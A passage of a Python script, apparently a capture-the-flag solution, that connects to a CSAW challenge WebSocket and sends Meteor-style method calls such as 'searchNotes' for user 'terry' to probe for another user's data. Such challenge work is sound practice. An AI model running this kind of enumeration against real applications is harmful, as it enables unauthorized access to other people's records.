            "params": ["terry"],
            "id": "m2"
        },
        {
            "msg": "method",
            "method": "searchNotes",
            "params": [{"author": "terry"}],
            "id": "m3"
        }
    ]

    for method in method_calls:
        print(f"Trying method: {method['method']}")
        ws.send(json.dumps(method))
        time.sleep(1)

# Connect to WebSocket
ws = websocket.WebSocketApp(
    "ws://web.chal.csaw.io:5000/websocket",
    on_message = on_message,
    on_error = on_error,
    on_close = on_close,
    on_open = on_open
)

